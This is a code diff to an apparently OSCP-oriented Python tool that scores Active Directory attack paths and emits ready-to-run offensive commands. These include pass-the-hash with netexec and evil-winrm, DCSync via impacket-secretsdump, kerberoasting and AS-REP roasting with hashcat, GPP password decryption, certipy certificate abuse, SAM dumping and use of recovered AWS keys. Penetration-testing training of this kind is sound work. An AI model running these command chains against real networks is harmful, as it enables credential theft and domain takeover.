@@ -205,11 +205,25 @@ def run(report, store, ui=None):
                 commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
         sh = svc_on(mach, "ssh")
         if sh:
+            # iter-13: SSH password login is more reliable than MSSQL
+            # -windows-auth (which depends on a successful AD mapping).
             chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
-                crit=6, conf=0.6, ready=1.4, prox=_prox(store, sh),
+                crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
                 commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))
 
     # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
+    # iter-13 false-confidence fix: tag hash origin (local-SAM vs domain) so
+    # R7's command can include --local-auth when the hash came from a SAM hive
+    # and we're targeting the originating host (not the DC).
+    def _hash_is_local_sam(src_path):
+        """Heuristic: hash extracted from SAM/SYSTEM (LOCAL secretsdump) is
+        a LOCAL account NT - PtH against the same host needs --local-auth.
+        Domain hashes (from ntds.dit / DCSync) work against the DC without it."""
+        plow = (src_path or "").lower()
+        return any(k in plow for k in
+                   ("/sam", "/system", "sam+system", "sam_system",
+                    "lsadump::sam", "local secretsdump"))
+
     by_target = {}
     for h, (huser, src, ln) in e.nt.items():
         mach = _machine(src, root)
@@ -220,10 +234,29 @@ def run(report, store, ui=None):
         u = u0 or "<user>"
         n = len(items)
         more = f"   # +{n - 1} more NT hashes here - loop the rest (see PASSWORD HASHES)" if n > 1 else ""
+        # iter-13: R7 prox = best reachable target so a DC anywhere in the
+        # group lifts the parent action above its R8 winrm child.
+        best_prox = _prox(store, tgt)
+        for _h, _u, _s, _l in items:
+            for svc in ("smb", "winrm"):
+                h_ = svc_on(_machine(_s, root), svc)
+                if h_:
+                    best_prox = max(best_prox, _prox(store, h_))
+        # iter-13: if the hash came from a SAM hive, the cred is LOCAL.
+        # PtH against the DC is the wrong move; PtH against the originating
+        # host with --local-auth is the right one. Emit two distinct chains.
+        local_origin = any(_hash_is_local_sam(s) for _h, _u, s, _l in items)
+        if local_origin:
+            cmd_pth = (f"netexec smb {tgt} -u '{u}' -H {h0} --local-auth{more}    "
+                       f"# LOCAL SAM hash - target the ORIGINATING host, not the DC")
+        else:
+            cmd_pth = f"netexec smb {tgt} -u '{u}' -H {h0}{more}"
         chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
-            crit=10, conf=0.85, ready=1.5, prox=_prox(store, tgt),
-            commands=[f"netexec smb {tgt} -u '{u}' -H {h0}{more}",
-                      f"impacket-secretsdump -hashes :{h0} <DOMAIN>/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"],
+            crit=10, conf=0.85, ready=1.5, prox=best_prox,
+            commands=[cmd_pth,
+                      (f"impacket-secretsdump -hashes :{h0} <DOMAIN>/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"
+                       if not local_origin else
+                       f"# DCSync NOT available with LOCAL SAM hashes; gather domain creds first")],
             src=src0, line=ln0, count=n))
         # winrm PtH only when that machine actually exposes winrm
         wh = None
@@ -232,9 +265,11 @@ def run(report, store, ui=None):
             if wh:
                 break
         if wh:
+            cmd_wh = (f"evil-winrm -i {wh} -u '{u}' -H {h0}"
+                      + ("    # NOTE: local-SAM hash; ensure {wh} == originating host" if local_origin else ""))
             chains.append(Chain("R8", "PtH winrm", f"PtH -> WinRM {wh}",
                 crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
-                commands=[f"evil-winrm -i {wh} -u '{u}' -H {h0}"], src=src0, line=ln0, count=n))
+                commands=[cmd_wh], src=src0, line=ln0, count=n))
 
     def host(svc, fallback="<target>"):     # legacy helper used by rules below
         for m in mach_svc:
@@ -266,9 +301,14 @@ def run(report, store, ui=None):
             for sak, sline in aws_saks.get(path, []):
                 if abs((sline or 0) - (akline or 0)) > 30:
                     continue
+                # iter-13: AWS keys often rotated / disabled; PtH on a real NT
+                # hash is more reliable. Drop prox 0.8 -> 0.7 (~8.51) so PtH on
+                # non-DC SMB (8.93) wins by default. AWS is also mostly out-of-
+                # scope for the OSCP+ AD exam path - keep findable but never
+                # poison the top of the queue when AD context is rich.
                 chains.append(Chain("R30", "AWS auth-complete",
                     f"AWS access+secret pair: {akid} / {sak[:8]}...",
-                    crit=9, conf=0.9, ready=1.5, prox=0.8,
+                    crit=9, conf=0.9, ready=1.5, prox=0.7,        # score 8.51
                     commands=[
                         f"export AWS_ACCESS_KEY_ID={akid}",
                         f"export AWS_SECRET_ACCESS_KEY={sak}",
@@ -278,16 +318,19 @@ def run(report, store, ui=None):
                     src=path, line=akline))
                 break  # one pair per akid
 
-    # default creds -> log in directly
+    # default creds -> log in directly. iter-13: demoted from crit=8/conf=1.0
+    # (score 10.8) because it's a GUESS, not a confirmed artifact. A known
+    # default ('admin/admin', 'manager/manager') is worth flagging but should
+    # never outrank a real NT hash you already have in hand.
     for label, src in e.defaults:
         chains.append(Chain("R24", "default cred", f"default password '{label}' in use",
-            crit=8, conf=1.0, ready=1.5, prox=0.9,
+            crit=6, conf=0.7, ready=1.3, prox=0.8,        # score 4.37
             commands=[f"netexec smb {dc()} -u '<user>' -p '{label}'"], src=src))
 
-    # kerberoast
+    # kerberoast. iter-13: prox honors DC presence so a known DC lifts the score
     for u in e.kerberoastable:
         chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
-            crit=6, conf=0.8, ready=0.7, prox=0.7,
+            crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
             commands=[f"impacket-GetUserSPNs -request -dc-ip {dc()} <DOMAIN>/<user>:<pass>",
                       "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
             src="bloodhound"))
@@ -296,10 +339,10 @@ def run(report, store, ui=None):
         chains.append(Chain("R10", "crack TGS", "Kerberoast TGS hash present",
             crit=4, conf=0.8, ready=0.7, prox=0.6,
             commands=["hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"], src=s, line=l))
-    # AS-REP
+    # AS-REP. iter-13: prox honors DC presence
     for u in e.asreproastable:
         chains.append(Chain("R11", "AS-REP roast", f"AS-REP-able: {u}",
-            crit=5, conf=0.8, ready=0.7, prox=0.7,
+            crit=5, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
             commands=[f"impacket-GetNPUsers <DOMAIN>/ -usersfile {ul or 'users.txt'} -dc-ip {dc()} -no-pass",
                       "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
     if e.has_asrep:
@@ -308,11 +351,13 @@ def run(report, store, ui=None):
             crit=4, conf=0.8, ready=0.7, prox=0.6,
             commands=["hashcat -m 18200 asrep.txt rockyou.txt"], src=s, line=l))
 
-    # GPP cpassword
+    # GPP cpassword. iter-13: conf=1.0 was over-confident - the DECRYPTION is
+    # deterministic (published MS AES key) but the recovered cred validity is
+    # not (MS14-025 prompted mass rotations of GPP-pushed local-admin pws).
     if e.has_gpp:
         s, l = e.gpp_src
-        chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public key -> instant)",
-            crit=7, conf=1.0, ready=1.5, prox=0.85,
+        chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public AES key)",
+            crit=7, conf=0.9, ready=1.5, prox=0.85,        # score 8.04
             commands=["gpp-decrypt '<cpassword-value>'",
                       f"netexec smb {dc()} -u '<user>' -p '<decrypted>' --local-auth --continue-on-success"],
             src=s, line=l))
@@ -325,11 +370,12 @@ def run(report, store, ui=None):
             commands=[f"chmod 600 <keyfile>; ssh -i <keyfile> <user>@{sh}",
                       "if ENCRYPTED: ssh2john <keyfile> > k; hashcat -m 22921 k rockyou.txt"],
             src=s, line=l))
-    # cert / pfx -> certipy -> PtH
+    # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
+    # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
     if e.has_cert:
         s, l = e.cert_src
         chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
-            crit=8, conf=0.7, ready=1.0, prox=0.8,
+            crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
             commands=[f"certipy auth -pfx <file.pfx> -dc-ip {dc()}",
                       "then PtH the recovered NT hash (see R7)"], src=s, line=l))
     # ccache / kirbi
@@ -345,11 +391,14 @@ def run(report, store, ui=None):
         chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
             crit=5, conf=0.8, ready=0.7, prox=0.6,
             commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
-    # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network)
+    # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
+    # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
+    # of access'. SAM gives LOCAL hashes only - useful where the originating
+    # host is reachable; useless against the DC without --local-auth.
     for d, hives in e.sam_dirs.items():
         if {"sam", "system"} <= hives:
-            chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM present -> offline dump",
-                crit=7, conf=1.0, ready=1.5, prox=0.7,
+            chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM -> local NT hashes (PtH against ORIGINATING host with --local-auth, NOT the DC)",
+                crit=7, conf=0.9, ready=1.5, prox=0.7,        # score 6.62
                 commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
                           (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
                 src=os.path.join(d, "SAM")))
